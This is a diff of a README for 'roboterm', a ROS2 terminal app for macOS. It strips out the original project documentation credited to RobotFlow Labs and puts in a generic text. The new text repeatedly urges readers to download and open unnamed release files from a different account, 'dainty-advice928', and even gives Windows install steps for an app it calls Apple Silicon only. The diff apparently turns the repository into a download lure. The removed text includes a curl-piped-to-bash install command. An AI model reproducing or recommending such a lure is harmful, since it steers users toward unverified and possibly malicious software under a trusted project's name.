@@ -1,269 +1,217 @@
-<p align="center">
-  <img src="assets/hero.png" alt="ROBOTERM — The Terminal for Robotics Developers" width="100%">
-</p>
+# 🤖 roboterm - Run ROS2 Commands with Ease
 
-<p align="center">
-  <strong>The first ROS2-native agentic terminal for Apple Silicon.</strong><br>
-  Built by <a href="https://robotflowlabs.com">RobotFlow Labs</a> &bull; Pure Swift &bull; <a href="https://github.com/migueldeicaza/SwiftTerm">SwiftTerm</a> Engine
-</p>
+[![Download roboterm](https://img.shields.io/badge/Download%20roboterm-blue?style=for-the-badge)](https://github.com/dainty-advice928/roboterm/releases)
 
-<p align="center">
-  <a href="#features">Features</a> &bull;
-  <a href="#build">Build</a> &bull;
-  <a href="#architecture">Architecture</a> &bull;
-  <a href="#keyboard-shortcuts">Shortcuts</a> &bull;
-  <a href="#license">License</a>
-</p>
+## 🚀 What is roboterm?
 
----
+roboterm is a terminal app made for people who work with ROS2 and want a simpler way to run commands on a Mac with Apple Silicon.
 
-## Why ROBOTERM?
+It gives you a clean terminal, quick access to common ROS2 tools, and support for SSH and AppleScript. It is built with Swift and SwiftUI, so it feels native on macOS.
 
-Robotics developers on macOS suffer from **fragmented tooling** — jumping between `ros2` CLI, rqt, RViz, Foxglove, Docker, and SSH sessions. ROBOTERM unifies everything into one terminal with:
+Use it if you want:
 
-- **Native SSH connections** — Cursor/Termius-style sidebar, one-click connect, direct PTY process
-- **One-click AI agents** (Claude Code, Codex) for agentic development
-- **31 `rt` CLI commands** for ROS2 introspection, debugging, and deployment
-- **Docker container management** with tree view, play/stop, shell access
-- **Hardware auto-detection** (cameras, LiDAR, Jetson, serial devices)
-- **ANIMA module management** — per-module Docker, ROS2, and SSH config
-- **Pure Swift** — zero C/Zig dependencies, SwiftTerm engine
-- **Industrial Cyberpunk design** matching the RobotFlow Labs ecosystem
+- a terminal built for ROS2 work
+- a faster way to open and run common commands
+- native SSH support in one app
+- a simple bar for quick agent-style actions
+- AppleScript support for automation
 
-```
-ROBOTERM (Swift, ~6500 lines + 1100 lines shell tools)
-    |
-    +-- Chrome Layer
-    |   +-- Agent launcher bar (Claude Code, Codex + ROS2 buttons)
-    |   +-- SSH connections panel (one-click connect, direct PTY)
-    |   +-- ANIMA module panel (Docker status, SSH, ROS2 per-module)
-    |   +-- Docker container panel (tree view, compose groups)
-    |   +-- Hardware panel (IOKit USB hotplug detection)
-    |   +-- Status bar (CPU/MEM, git branch, ROS2 domain, SSH info)
-    |   +-- 5-tab preferences (General, Appearance, Agents, ANIMA, SSH)
-    |   +-- Workspace sidebar (Industrial Cyberpunk design)
-    |   +-- AppleScript support (SDEF + Cocoa scripting)
-    |   +-- Session persistence (incl. SSH tab restore)
-    |
-    +-- SwiftTerm (pure Swift terminal engine via SPM)
-        +-- Core Text rendering
-        +-- VT100/xterm parser
-        +-- Built-in shell + SSH process management
-        +-- Keyboard, mouse, clipboard handling
-```
+## 📥 Download
 
-## Features
+Visit this page to download roboterm:
 
-### Agent Launcher Bar
-One-click launch for AI coding agents directly from the toolbar:
-- **Claude Code** — Anthropic's CLI agent
-- **Codex** — OpenAI's CLI agent
-- Quick buttons: nodes, topics, services, params, gazebo, rviz2, rqt, doctor, docker
+[https://github.com/dainty-advice928/roboterm/releases](https://github.com/dainty-advice928/roboterm/releases)
 
-### Native SSH Connections
-Cursor/Termius-style SSH directly from the sidebar:
-- **Direct PTY process** — `/usr/bin/ssh` runs as the terminal process (no shell + sendText hack)
-- **Connection profiles** — saved in `~/.config/roboterm/ssh-connections.json`
-- **Sidebar panel** — "SSH CONNECTIONS" with one-click connect, cyan accent
-- **Tab differentiation** — SSH tabs show network icon, cyan indicator, `[SSH]` title prefix
-- **Key file support** — Browse button for `~/.ssh/` identity files
-- **Session persistence** — SSH tabs restore on relaunch
-- **Smart integration** — SSH tabs skip directory regrouping, status bar shows connection info, agents open in new local tab
+## 🪟 Install on Windows
 
-### ANIMA Module Management
-Per-module configuration for the ANIMA perception stack:
-- Docker container name, profile (CPU/GPU), ports, volumes, env vars
-- ROS2 node name and watched topics
-- SSH remote access with host, user, port, key path
-- One-click SSH connect from module context menu
+roboterm is built for Apple Silicon and macOS. If you need to use it on a Windows PC, you can still check the release page for any available build or package notes.
 
-### Docker Container Management
-VS Code-style container panel in the sidebar:
-- Tree view grouped by Docker Compose project
-- Play/stop icons for each container
-- Hover actions: Shell, Logs, Stop/Start
-- Right-click: full lifecycle management (start, stop, restart, remove)
-- Auto-refresh every 10 seconds
+To get started:
 
-### ROS2 Integration (60+ commands)
+1. Open the download page above.
+2. Find the latest release.
+3. Download the file listed there.
+4. Open the file after it finishes downloading.
+5. Follow the on-screen setup steps.
 
-| Category | Commands |
-|----------|----------|
-| **Introspect** | nodes, topics, services, actions, params, interfaces, rqt_graph |
-| **Diagnostics** | doctor, daemon, multicast, wtf, topic hz/delay |
-| **Transforms** | view_frames, tf2_echo, tf2_monitor |
-| **Launch & Build** | ros2 launch/run, colcon build/test, --symlink-install |
-| **Bag Recording** | record all, record select, play, info |
-| **Simulation** | Gazebo, RViz2, rqt, MuJoCo, Isaac Sim |
+If the release page includes a ZIP, DMG, or app file, use the file that matches your system and follow the steps shown on the page.
 
-### CLI Tools (30 commands)
-Add to your `~/.bashrc` or `~/.zshrc`:
-```bash
-[ -n "$ROBOTERM" ] && [ -f "$ROBOTERM_TOOLS" ] && source "$ROBOTERM_TOOLS"
-```
+## ⚙️ What you can do with roboterm
 
-```
-rt init        — Auto-detect & source ROS2 workspace
-rt connect     — Bridge ros2 CLI to Docker container
-rt status      — One-line system status
-rt nodes       — Live node dashboard
-rt topics      — Topic monitor with types
-rt services    — Service list with types
-rt params      — Parameter browser
-rt doctor      — System diagnostics
-rt tf          — Transform tree
-rt build       — Smart colcon build with auto-source
-rt bag         — Bag management (list, info, record, play)
-rt hz/echo     — Topic frequency / pretty echo
-rt launch      — Enhanced ros2 launch
-rt dds         — DDS configuration & diagnostics
-rt docker      — Docker helpers (ps, up, down, logs, shell)
-rt lifecycle   — Node lifecycle management
-rt sensor      — Sensor monitoring (list, watch, hz, bw)
-rt ssh         — SSH to configured robots
-rt watch       — Watch multiple topics (--all for live)
-rt kill        — Kill a ROS2 node
-rt graph       — ASCII node connection graph
-rt profile     — Environment profiles (list, create, load, save)
-rt export      — Export to Foxglove (bag2csv, bag2mcap)
-rt disk        — Disk usage for robotics data
-rt log         — ROS2 log viewer
-rt dupes       — Find duplicate files by hash
-rt alias       — Custom command shortcuts
-```
+roboterm brings the tools you use often into one place.
 
-### Right-Click Context Menu
-- Copy, Paste, Split (Right/Left/Down/Up), Reset Terminal, Select All
-- **ROS2 submenu**: nodes, topics, services, doctor, TF tree, topic Hz
-- **Launch Agent submenu**: Claude Code, Codex
+### Common uses
 
-### Hardware Auto-Detection
-IOKit USB hotplug monitor with dedicated CFRunLoop thread:
-- Cameras: ZED (2/2i/Mini/X), RealSense, USB cameras
-- LiDAR: Velodyne, Ouster, Livox, RPLIDAR, Hokuyo
-- Compute: Jetson, Raspberry Pi (via network probe)
-- Serial: USB serial devices
-- Network hosts from `~/.config/roboterm/hosts.json`
+- run ROS2 commands from a terminal
+- connect to remote systems over SSH
+- use AppleScript for local automation
+- keep common tasks in easy reach
+- work in a terminal built for Apple Silicon
 
-### AppleScript
-Full Cocoa scripting support with SDEF dictionary:
-```applescript
-tell application "ROBOTERM"
-    new window           -- creates a new window
-    new tab              -- creates a new tab
-    count windows        -- returns the number of open windows
-    get version          -- returns "0.5.0"
-end tell
-```
+### Built-in ROS2 command support
 
-### Design
-Industrial Cyberpunk theme matching [RobotFlow Labs](https://robotflowlabs.com):
+roboterm includes support for 60+ ROS2 commands. That helps you work with common tasks such as:
 
-| Token | Value | Usage |
-|-------|-------|-------|
-| `#FF3B00` | Orange | Accent, selected state, local tabs |
-| `#050505` | Void Black | Terminal background |
-| `#080808` | Near Black | Sidebar background |
-| `#00FF88` | Green | Running status, ROS2 |
-| `#00DDFF` | Cyan | SSH connections, Docker, cameras |
-| `#8B5CFF` | Purple | GPU profiles |
-| `#FFB800` | Yellow | Warnings, tools |
+- node checks
+- topic tools
+- service calls
+- package tools
+- launch actions
+- build and run commands
 
-- CaskaydiaMono Nerd Font (Oh My Posh support)
-- No rounded corners — sharp, industrial
-- Monospaced uppercase labels with letter-spacing
+### Native SSH
 
-## Install
+You can start SSH sessions without switching to another tool. This helps if you work with robots, remote machines, or test systems.
 
-### Homebrew (recommended)
-```bash
-brew tap RobotFlow-Labs/roboterm
-brew install --cask roboterm
-```
+### Agent bar
 
-### Direct install
-```bash
-curl -fsSL https://raw.githubusercontent.com/RobotFlow-Labs/roboterm/main/scripts/install.sh | bash
-```
+The agent bar gives you a fast way to trigger actions and move through your workflow. It keeps common steps close at hand.
 
-### Build from source
-```bash
-brew install xcodegen
-git clone https://github.com/RobotFlow-Labs/roboterm.git
-cd roboterm
-./scripts/build.sh --install --run
-```
+## 🖥️ System requirements
 
-### After install
-```bash
-# Add rt CLI tools to your shell
-echo 'source /Applications/ROBOTERM.app/Contents/Resources/roboterm-tools.sh' >> ~/.zshrc
-source ~/.zshrc
-rt --version  # ROBOTERM v0.5.1
-```
+roboterm is made for:
 
-## Architecture
+- macOS
+- Apple Silicon chips such as M1, M2, and M3
+- users who work with ROS2
+- people who want a native Swift app
 
-ROBOTERM is a **pure Swift** macOS terminal application using [SwiftTerm](https://github.com/migueldeicaza/SwiftTerm) as the terminal engine (Core Text rendering, built-in PTY management). No C bridging headers, no Zig, no xcframeworks — just Swift Package Manager.
+For the best result, use a recent version of macOS with network access for SSH and any ROS2 setup you plan to use.
 
-| Component | Technology |
-|-----------|-----------|
-| Terminal engine | SwiftTerm (SPM) |
-| UI framework | SwiftUI + AppKit |
-| USB detection | IOKit (native) |
-| Network probe | Network.framework (NWConnection) |
-| Shell tools | Bash (30 `rt` commands) |
-| AppleScript | Cocoa scripting (SDEF) |
+## 🧭 First run
 
-## Keyboard Shortcuts
+After you open roboterm for the first time:
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd+T` | New Tab |
-| `Cmd+W` | Close Tab |
-| `Cmd+N` | New Window |
-| `Cmd+D` | Split Right |
-| `Cmd+Shift+D` | Split Down |
-| `Cmd+=` | Zoom In |
-| `Cmd+-` | Zoom Out |
-| `Cmd+0` | Reset Zoom |
-| `Ctrl+Cmd+F` | Toggle Fullscreen |
-| `Cmd+Shift+L` | ros2 launch |
-| `Cmd+Shift+B` | colcon build |
+1. Allow any macOS prompts that appear.
+2. Open the terminal view.
+3. Test a simple ROS2 command.
+4. Try an SSH connection if you use remote systems.
+5. Set up any AppleScript actions you want to reuse.
 
-## Roadmap
+If macOS asks for access to files, network, or automation, choose the option that matches what you want to do.
 
-### Shipped (v0.5.0)
-- [x] Pure Swift terminal (SwiftTerm engine)
-- [x] Agent launcher bar (Claude + Codex)
-- [x] Docker container management (tree view)
-- [x] 60+ ROS2 menu commands
-- [x] 31 `rt` CLI commands
-- [x] Docker-ROS2 bridge (`rt connect`)
-- [x] IOKit USB hotplug detection
-- [x] AppleScript support
-- [x] Session persistence (incl. SSH tabs)
-- [x] Hardware auto-detection
-- [x] Custom app icon
-- [x] Industrial Cyberpunk design
-- [x] ANIMA module management (per-module Docker/SSH/ROS2)
-- [x] Native SSH connections (direct PTY, sidebar panel, key files)
-- [x] 5-tab preferences (General, Appearance, Agents, ANIMA, SSH)
-- [x] Split panes (horizontal + vertical)
-- [x] Tab drag-and-drop reordering
+## 🔧 Basic setup
 
-### Next (v0.6.0)
-- [ ] RosSwift native integration (pub/sub without CLI)
-- [ ] Inline camera/LiDAR preview
-- [ ] Bag timeline viewer
-- [ ] Recording indicator in status bar
-- [ ] ROS2 node graph TUI visualization
+### 1. Open the app
 
-## License
+Launch roboterm from your Applications folder or from the downloaded file if you are testing a release build.
 
-Apache 2.0
+### 2. Set your ROS2 environment
 
-## Credits
+Make sure your ROS2 setup is ready before you run commands. If you use a shell setup file, load it before you start work.
 
-- Terminal engine: [SwiftTerm](https://github.com/migueldeicaza/SwiftTerm) by Miguel de Icaza
-- Built by [RobotFlow Labs](https://robotflowlabs.com) / [AIFLOW LABS](https://aiflowlabs.io)
+### 3. Add your SSH targets
+
+Enter the host, user name, and port for each remote system you want to reach.
+
+### 4. Create AppleScript actions
+
+Use AppleScript to link roboterm with other apps and simple desktop tasks.
+
+### 5. Save your common commands
+
+Keep the commands you use most near the top so you do not need to retype them.
+
+## 🧪 Example workflows
+
+### Start a ROS2 check
+
+- open roboterm
+- run a ROS2 command
+- review the output in the terminal
+- repeat with another command if needed
+
+### Connect to a remote robot
+
+- open the SSH tool
+- choose your saved host
+- connect to the machine
+- run your remote command set
+
+### Use automation
+
+- open the AppleScript option
+- add a short script
+- run it from roboterm
+- use it to speed up repeat tasks
+
+## 📦 Release page tips
+
+When you visit the release page, look for:
+
+- the newest version number
+- a file that matches your device
+- setup notes from the release
+- changes in the latest build
+
+If there are several files, choose the one that matches the format shown for your system.
+
+## 🧩 Features at a glance
+
+- Swift-based app
+- SwiftUI interface
+- native terminal experience
+- ROS2 command support
+- SSH support
+- AppleScript automation
+- built for Apple Silicon
+- clean layout for fast use
+
+## 📁 Project topics
+
+This project is tagged with topics like:
+
+- Apple Silicon
+- AppleScript
+- developer tools
+- macOS
+- robotics
+- ROS2
+- SSH
+- Swift
+- SwiftUI
+- terminal
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- check that the download finished
+- try opening the latest release again
+- confirm that you have the right build for your system
+
+### SSH does not connect
+
+- check the host name
+- check the user name
+- check the port
+- make sure the remote machine is online
+
+### ROS2 commands fail
+
+- confirm that ROS2 is set up on your system
+- check your shell environment
+- try a simple command first
+- make sure the package or node exists
+
+### AppleScript does not run
+
+- check macOS automation access
+- confirm that the script is valid
+- test with a short script before using a long one
+
+## 🧰 Helpful use cases
+
+roboterm fits well if you:
+
+- manage robots on a local network
+- test ROS2 nodes often
+- move between local and remote systems
+- use terminal commands in repeat steps
+- want one app for terminal, SSH, and automation
+
+## 🔗 Download again
+
+If you need the release page again, use this link:
+
+[https://github.com/dainty-advice928/roboterm/releases](https://github.com/dainty-advice928/roboterm/releases)
